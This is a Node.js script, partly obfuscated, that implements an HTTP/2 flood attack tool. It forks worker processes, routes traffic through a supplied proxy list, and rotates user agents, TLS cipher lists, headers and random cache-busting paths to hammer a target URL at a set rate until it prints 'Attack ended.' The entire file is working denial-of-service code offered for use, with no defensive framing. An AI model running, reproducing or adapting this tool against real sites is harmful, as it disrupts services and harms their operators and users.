const url = require('url'),
fs = require('fs'),
http2 = require('http2'),
http = require('http'),
tls = require('tls'),
net = require('net'),
cluster = require('cluster'),
fakeua = require('fake-useragent'),
colors = require('colors');

refers = [ "https://www.google.com" , "https://check-host.net" , "https://www.facebook.com" , "https://google.com", "https://youtube.com" , "https://facebook.com"
],

cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
],
accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
],

patht = [
	"?s=",
	"?true=",
	"/",
	"//",
	"?q=",
	"//?",
	"/?",
	"?"
],

lang_header = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB',
    'en-AU',
    'en-CA',
    'en-NZ',
    'en-ZA',
    'en-IN',
    'en-PH',
    'en-SG',
    'en-ZA',
    'en-HK',
    'en-US',
    '*',
    'en-US,en;q=0.5',
    'utf-8, iso-8859-1;q=0.5, *;q=0.1',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-GB, en-US, en;q=0.9',
    'de-AT, de-DE;q=0.9, en;q=0.5'
],
encoding_header = [
    '*',
    'gzip, deflate',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate'
],
control_header = [
    'max-age=604800',
    's-maxage=604800',
    'no-cache',
    'max-age=0',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate'
],

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).setMaxListeners(0);

function randstr(_0xf3b6x10) {
  var _0xf3b6x11 = "";
  var _0xf3b6x12 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var _0xf3b6x13 = _0xf3b6x12.length;
  for (var _0xf3b6x14 = 0; _0xf3b6x14 < _0xf3b6x10; _0xf3b6x14++) {
    _0xf3b6x11 += _0xf3b6x12.charAt(Math.floor(Math.random() * _0xf3b6x13));
  }
  ;
  return _0xf3b6x11;
}
function dataed(_0xf3b6x10) {
  var _0xf3b6x11 = "";
  var _0xf3b6x12 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  var _0xf3b6x13 = _0xf3b6x12.length;
  for (var _0xf3b6x14 = 0; _0xf3b6x14 < _0xf3b6x10; _0xf3b6x14++) {
    _0xf3b6x11 += _0xf3b6x12.charAt(Math.floor(Math.random() * _0xf3b6x13));
  }
  ;
  return _0xf3b6x11;
}
if (process.argv.length < 8) {
  console.log("	");
  process.exit(0);
}
;
var rate = process.argv[6];
var method = process.argv[2];
var proxys = fs.readFileSync(process.argv[4], "utf-8").toString().replace(/\r/g, "").split("\n");
if (cluster.isMaster) {
  const dateObj = new Date;
  for (var bb = 0; bb < process.argv[6]; bb++) {
    cluster.fork();
  }
  ;
  setTimeout(() => {
    console.log("Attack ended.".green.bold);
    process.exit(-1);
  }, process.argv[5] * 1e3);
} else {
  function flood() {
    var _0xf3b6x1d = url.parse(process.argv[3]);
    const _0xf3b6x1e = fakeua();
    var _0xf3b6x1f = cplist[Math.floor(Math.random() * cplist.length)];
    var _0xf3b6x20 = proxys[Math.floor(Math.random() * proxys.length)].split(":");
    var _0xf3b6x21 = dataed(4);
    var _0xf3b6x22 = {":method": method, ":scheme": "https", ":path": _0xf3b6x1d.path + patht[Math.floor(Math.random() * patht.length)] + randstr(25), Referer: "https://www.google.com", "User-agent": _0xf3b6x1e, "X-Forwarded-For": _0xf3b6x20[0], "Upgrade-Insecure-Requests": "1", "Accept-encoding": accept_header[Math.floor(Math.random() * accept_header.length)], "Cache-Control": control_header[Math.floor(Math.random() * control_header.length)]};
    const _0xf3b6x23 = new http.Agent({keepAlive: true, keepAliveMsecs: 1e4, maxSockets: Infinity});
    var _0xf3b6x24 = http.request({host: _0xf3b6x20[0], agent: _0xf3b6x23, globalAgent: _0xf3b6x23, port: _0xf3b6x20[1], timeout: 1e4, ciphers: _0xf3b6x1f, headers: {Host: _0xf3b6x1d.host, "Proxy-Connection": "Keep-Alive", Connection: "Keep-Alive"}, method: "CONNECT", path: _0xf3b6x1d.host + ":443"}, function () {
      _0xf3b6x24.setSocketKeepAlive(true);
    });
    _0xf3b6x24.on("connect", function (_0xf3b6x25, _0xf3b6x26, _0xf3b6x27) {
      const _0xf3b6x28 = http2.connect(_0xf3b6x1d.href, {createConnection: () => {
        return tls.connect({host: _0xf3b6x1d.host, ciphers: _0xf3b6x1f, secureProtocol: "TLS_method", servername: _0xf3b6x1d.host, challengesToSolve: Infinity, clientTimeout: Infinity, clientlareMaxTimeout: Infinity, maxRedirects: Infinity, gzip: false, decodeEmails: false, honorCipherOrder: true, requestCert: true, port: 443, secure: true, rejectUnauthorized: false, ALPNProtocols: ["h2"], socket: _0xf3b6x26}, function () {
          for (let _0xf3b6x14 = 0; _0xf3b6x14 < rate; _0xf3b6x14++) {
            const _0xf3b6x24 = _0xf3b6x28.request(_0xf3b6x22);
            _0xf3b6x24.setEncoding("utf8");
            _0xf3b6x24.on("data", _0xf3b6x29 => {});
            _0xf3b6x24.on("response", () => {
              _0xf3b6x24.close();
            });
            _0xf3b6x24.end();
          }
        });
      }});
    });
    _0xf3b6x24.end();
  }
  setInterval(() => {
    flood();
  });
}
